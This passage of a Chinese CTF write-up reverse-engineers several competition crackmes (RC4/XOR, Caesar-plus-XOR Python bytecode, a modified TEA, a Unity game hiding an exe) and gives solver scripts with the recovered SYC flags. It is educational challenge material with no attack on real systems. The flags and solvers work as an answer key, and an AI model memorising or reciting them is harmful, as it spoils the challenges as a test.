class="keyword">try</span>:</span><br><span class="line">        plaintext = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> plaintext]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plaintext)):</span><br><span class="line">        plaintext[i] ^= xor_list[i]</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor2</span>(<span class="params">plaintext</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        plaintext = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> plaintext]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plaintext) - <span class="number">1</span>):</span><br><span class="line">        plaintext[i + <span class="number">1</span>] = plaintext[i] ^ plaintext[i + <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">plaintext, key, xor_list</span>):</span><br><span class="line">    plaintext = rc4(plaintext, key)</span><br><span class="line">    plaintext = xor1(plaintext, xor_list)</span><br><span class="line">    plaintext = xor2(plaintext)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line">plaintext = <span class="built_in">input</span>(<span class="string">&#x27;please give your input:&#x27;</span>)</span><br><span class="line">key = <span class="string">&#x27;SYCFOREVER&#x27;</span></span><br><span class="line">xor_list = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="built_in">len</span>(plaintext)))</span><br><span class="line">cipher = [<span class="number">158</span>, <span class="number">31</span>, <span class="number">205</span>, <span class="number">434</span>, <span class="number">354</span>, <span class="number">15</span>, <span class="number">383</span>, <span class="number">298</span>, <span class="number">304</span>, <span class="number">351</span>, <span class="number">465</span>, <span class="number">312</span>, <span class="number">261</span>, <span class="number">442</span>, <span class="number">397</span>, <span class="number">474</span>, <span class="number">310</span>, <span class="number">397</span>, <span class="number">31</span>, <span class="number">21</span>, <span class="number">78</span>, <span class="number">67</span>, <span class="number">47</span>, <span class="number">133</span>, <span class="number">168</span>, <span class="number">48</span>, <span class="number">153</span>, <span class="number">99</span>, <span class="number">103</span>, <span class="number">204</span>, <span class="number">137</span>, <span class="number">29</span>, <span class="number">22</span>, <span class="number">13</span>, <span class="number">228</span>, <span class="number">3</span>, <span class="number">136</span>, <span class="number">141</span>, <span class="number">248</span>, <span class="number">124</span>, <span class="number">26</span>, <span class="number">26</span>, <span class="number">65</span>, <span class="number">200</span>, <span class="number">7</span>]</span><br><span class="line">plaintext = enc(plaintext, key, xor_list)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">    <span class="keyword">if</span> cipher[i] != plaintext[i]:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Wrong&#x27;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;You know the flag!!&#x27;</span>)</span><br></pre></td></tr></table></figure><p>再反编译 <code>Rc.pyc</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">KSA</span>(<span class="params">key</span>):</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    key_length = <span class="built_in">len</span>(key)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + key[i % key_length]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = (S[j], S[i])</span><br><span class="line">    <span class="keyword">return</span> S</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PRGA</span>(<span class="params">S</span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = (S[j], S[i])</span><br><span class="line">        k = (S[i] + S[j]) % <span class="number">256</span></span><br><span class="line">        <span class="keyword">yield</span> k</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4</span>(<span class="params">plaintext, key</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        key = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> key]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        plaintext = [<span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> plaintext]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plaintext)):</span><br><span class="line">        plaintext[i] += i</span><br><span class="line">    S = KSA(key)</span><br><span class="line">    xor_value = PRGA(S)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plaintext)):</span><br><span class="line">        plaintext[i] ^= <span class="built_in">int</span>(<span class="built_in">next</span>(xor_value)) + <span class="number">6</span></span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br></pre></td></tr></table></figure><p>根据逻辑逆：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = [<span class="number">158</span>, <span class="number">31</span>, <span class="number">205</span>, <span class="number">434</span>, <span class="number">354</span>, <span class="number">15</span>, <span class="number">383</span>, <span class="number">298</span>, <span class="number">304</span>, <span class="number">351</span>, <span class="number">465</span>, <span class="number">312</span>, <span class="number">261</span>, <span class="number">442</span>, <span class="number">397</span>, <span class="number">474</span>, <span class="number">310</span>, <span class="number">397</span>, <span class="number">31</span>, <span class="number">21</span>, <span class="number">78</span>, <span class="number">67</span>, <span class="number">47</span>, <span class="number">133</span>, <span class="number">168</span>, <span class="number">48</span>, <span class="number">153</span>, <span class="number">99</span>, <span class="number">103</span>, <span class="number">204</span>, <span class="number">137</span>, <span class="number">29</span>, <span class="number">22</span>, <span class="number">13</span>, <span class="number">228</span>, <span class="number">3</span>, <span class="number">136</span>, <span class="number">141</span>, <span class="number">248</span>, <span class="number">124</span>, <span class="number">26</span>, <span class="number">26</span>, <span class="number">65</span>, <span class="number">200</span>, <span class="number">7</span>]</span><br><span class="line">xor_list = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="built_in">len</span>(c)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)-<span class="number">2</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    c[i+<span class="number">1</span>] ^= c[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">    c[i] ^= xor_list[i]</span><br><span class="line"></span><br><span class="line">N = <span class="number">256</span></span><br><span class="line">S = [<span class="number">0</span>] * N</span><br><span class="line">key = <span class="string">&#x27;SYCFOREVER&#x27;</span></span><br><span class="line">Key = [<span class="number">0</span>] * N</span><br><span class="line"></span><br><span class="line">t = c[:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">	S[i] = i</span><br><span class="line">	Key[i] = <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])</span><br><span class="line"></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">	j = (j + S[i] + Key[i]) % N</span><br><span class="line">	S[i], S[j] = S[j], S[i]</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(t)):</span><br><span class="line">	i = (i + <span class="number">1</span>) % N</span><br><span class="line">	j = (j + S[i]) % N</span><br><span class="line">	S[i], S[j] = S[j], S[i]</span><br><span class="line">	t[k] ^= (S[i] + S[j]) % N + <span class="number">6</span></span><br><span class="line"></span><br><span class="line">t = [t[i]-i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(t))]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(t))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;Bel1eve_thAt_you_a3e_Unique_@nd_tHe_beSt&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​</p><h3 id="好像是python？"><a href="#好像是python？" class="headerlink" title="好像是python？"></a>好像是python？</h3><blockquote><p>Gir@ffe乱用python命令，得到了一个奇怪的文件，你能分析出完整逻辑吗？</p></blockquote><p>python字节码，扔给gpt还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 初始标识设置</span></span><br><span class="line">flag = <span class="string">&#x27;SYC&#123;MD5(input)&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 提示用户输入</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Please input0:&#x27;</span>)</span><br><span class="line">input0 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义函数 test2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test2</span>(<span class="params">s2</span>):</span><br><span class="line">    key = <span class="string">&#x27;SYC&#x27;</span></span><br><span class="line">    length = <span class="number">18</span></span><br><span class="line">    cipher = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        <span class="comment"># 对每个字符进行 XOR 和其他变换</span></span><br><span class="line">        cipher.append(</span><br><span class="line">            (<span class="built_in">ord</span>(s2[i]) ^ i) + ~<span class="built_in">ord</span>(key[i % <span class="number">3</span>]) + <span class="number">1</span></span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义函数 test</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">s, R</span>):</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="comment"># 判断并转换大写字母</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;A&#x27;</span> &lt;= i &lt;= <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">            result.append(<span class="built_in">chr</span>((<span class="built_in">ord</span>(i) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) + R) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)))</span><br><span class="line">        <span class="comment"># 判断并转换小写字母</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;a&#x27;</span> &lt;= i &lt;= <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">            result.append(<span class="built_in">chr</span>((<span class="built_in">ord</span>(i) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + R) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)))</span><br><span class="line">        <span class="comment"># 判断并转换数字</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;0&#x27;</span> &lt;= i &lt;= <span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">            result.append(<span class="built_in">chr</span>((<span class="built_in">ord</span>(i) - <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>) + R) % <span class="number">10</span> + <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>)))</span><br><span class="line">        <span class="comment"># 其他字符不变</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result.append(i)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化变量并进行运算</span></span><br><span class="line">a = <span class="number">13</span></span><br><span class="line">b = <span class="number">14</span></span><br><span class="line">c = (a + b) ^ a</span><br><span class="line">d = b * <span class="number">100</span></span><br><span class="line">e = a ^ b</span><br><span class="line">m = d - c * <span class="number">4</span> + e - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 取模运算</span></span><br><span class="line">r = m % <span class="number">26</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用 test 和 test2 函数</span></span><br><span class="line">cipher1 = test(input0, r)</span><br><span class="line">cipher2 = test2(cipher1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义常量列表</span></span><br><span class="line">num = [-<span class="number">1</span>, -<span class="number">36</span>, <span class="number">26</span>, -<span class="number">5</span>, <span class="number">14</span>, <span class="number">41</span>, <span class="number">6</span>, -<span class="number">9</span>, <span class="number">60</span>, <span class="number">29</span>, -<span class="number">28</span>, <span class="number">17</span>, <span class="number">21</span>, <span class="number">7</span>, <span class="number">35</span>, <span class="number">38</span>, <span class="number">26</span>, <span class="number">48</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证 cipher2 是否与 num 匹配</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">    <span class="keyword">if</span> cipher2[i] != num[i]:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;wrong!&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Rrrright!&#x27;</span>)</span><br></pre></td></tr></table></figure><p>逆：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">deROT</span>(<span class="params">s, R</span>):</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;A&#x27;</span> &lt;= i &lt;= <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">            result.append(<span class="built_in">chr</span>((<span class="built_in">ord</span>(i) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) - R) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)))</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;a&#x27;</span> &lt;= i &lt;= <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">            result.append(<span class="built_in">chr</span>((<span class="built_in">ord</span>(i) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) - R) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)))</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;0&#x27;</span> &lt;= i &lt;= <span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">            result.append(<span class="built_in">chr</span>((<span class="built_in">ord</span>(i) - <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>) - R) % <span class="number">10</span> + <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>)))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result.append(i)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(result)</span><br><span class="line"></span><br><span class="line">c = [-<span class="number">1</span>, -<span class="number">36</span>, <span class="number">26</span>, -<span class="number">5</span>, <span class="number">14</span>, <span class="number">41</span>, <span class="number">6</span>, -<span class="number">9</span>, <span class="number">60</span>, <span class="number">29</span>, -<span class="number">28</span>, <span class="number">17</span>, <span class="number">21</span>, <span class="number">7</span>, <span class="number">35</span>, <span class="number">38</span>, <span class="number">26</span>, <span class="number">48</span>]</span><br><span class="line">r = <span class="number">14</span></span><br><span class="line">key = <span class="string">b&#x27;SYC&#x27;</span></span><br><span class="line">c1 = [(c[i] - ~key[i % <span class="number">3</span>] - <span class="number">1</span>)^i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c))]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(c1))</span><br><span class="line"></span><br><span class="line">c2 = deROT(<span class="built_in">bytes</span>(c1).decode(),r)</span><br><span class="line"><span class="built_in">print</span>(c2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#D0_You_Iik3_python</span></span><br><span class="line"><span class="comment">#SYC&#123;ed798fdd74e5c382b9c7fcca88500aca&#125;</span></span><br></pre></td></tr></table></figure><p>​</p><h3 id="DH爱喝茶"><a href="#DH爱喝茶" class="headerlink" title="DH爱喝茶"></a>DH爱喝茶</h3><blockquote><p>期待已久的DH终于来到你的家里，你欣喜若狂，但仍需按捺下心思，为DH备好花和茶吧。</p></blockquote><p>除花之后，发现加密逻辑为tea加密，魔改key每次加密时，每个值需要左移6*4位。</p><p>逆：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rol4</span>(<span class="params">value, shift=<span class="number">6</span></span>):</span><br><span class="line">    <span class="keyword">return</span> ((value &lt;&lt; shift) &amp; <span class="number">0xFFFFFFFF</span>) | (value &gt;&gt; (<span class="number">32</span> - shift))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ror4</span>(<span class="params">value, shift=<span class="number">6</span></span>):</span><br><span class="line">    <span class="keyword">return</span> ((value &gt;&gt; shift) | (value &lt;&lt; (<span class="number">32</span> - shift))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    delta = ((k[<span class="number">0</span>]^k[<span class="number">1</span>])&amp; <span class="number">0xFF</span>) + <span class="number">0x98765432</span></span><br><span class="line">    x = delta * <span class="number">32</span></span><br><span class="line">    k0 = k[<span class="number">0</span>]</span><br><span class="line">    k1 = k[<span class="number">1</span>]</span><br><span class="line">    k2 = k[<span class="number">2</span>]</span><br><span class="line">    k3 = k[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3)</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1)</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line">key = [<span class="number">0x56789ABC</span>, <span class="number">0x6789ABCD</span>, <span class="number">0x789ABCDE</span>, <span class="number">0x89ABCDEF</span>]</span><br><span class="line">key = [rol4(k) <span class="keyword">for</span> k <span class="keyword">in</span> key]</span><br><span class="line"></span><br><span class="line">encrypted = [<span class="number">0x1F85A965</span>,<span class="number">0xEEC063EC</span>,<span class="number">0x5BF1D0B6</span>,<span class="number">0xF2FDE7B0</span>,<span class="number">0xAA38809A</span>,<span class="number">0x670772E9</span>,<span class="number">0x360D24B9</span>,<span class="number">0xE98C688C</span>]</span><br><span class="line"></span><br><span class="line">final = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encrypted)//<span class="number">2</span>-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    now = decrypt(encrypted[<span class="number">2</span>*i:<span class="number">2</span>*(i+<span class="number">1</span>)], key)</span><br><span class="line">    key[i] = ror4(key[i])</span><br><span class="line">    final = long_to_bytes(now[<span class="number">0</span>])[::-<span class="number">1</span>] + long_to_bytes(now[<span class="number">1</span>])[::-<span class="number">1</span>] + final</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(final)</span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;SYC&#123;DH_likes_flower_and_tea!!!!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​</p><h3 id="玩就行了"><a href="#玩就行了" class="headerlink" title="玩就行了"></a>玩就行了</h3><blockquote><p>师傅们思来想去想要给大家搞点乐趣，快来和三叶草娘一起玩游戏吧~</p><p>链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1gXKEZJbRhyEfO6BHHQ1bLw?pwd=game">https://pan.baidu.com/s/1gXKEZJbRhyEfO6BHHQ1bLw?pwd=game</a> 提取码: game</p></blockquote><p>Unity游戏，IlSpy 分析 <code>\玩就行了\玩就行了_BackUpThisFolder_ButDontShipItWithYourGame\Managed</code>，关键代码：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SYC</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">string</span> hexString = LoadHexDataFromResources(<span class="string">&quot;output&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">string</span>.IsNullOrEmpty(hexString))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">string</span> filePath = Path.Combine(Directory.GetParent(Application.dataPath).FullName, <span class="string">&quot;Data.txt&quot;</span>);</span><br><span class="line">        <span class="built_in">string</span> directoryPath = Path.GetDirectoryName(filePath);</span><br><span class="line">        <span class="keyword">if</span> (!Directory.Exists(directoryPath))</span><br><span class="line">        &#123;</span><br><span class="line">            Directory.CreateDirectory(directoryPath);</span><br><span class="line">        &#125;</span><br><span class="line">        File.WriteAllText(filePath, hexString);</span><br><span class="line">        Debug.Log(<span class="string">&quot;File saved at: &quot;</span> + filePath);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        Debug.LogError(<span class="string">&quot;Failed to load hex data from resources.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用AssetStudio加载资源文件 <code>\玩就行了\玩就行了_Data\resources.assets</code>，</p><p>导出output内容，16进制转字节，保存为exe文件，逆向找到关键代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">117</span>]; <span class="comment">// [rsp+2Bh] [rbp-55h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Str[<span class="number">108</span>]; <span class="comment">// [rsp+A0h] [rbp+20h] 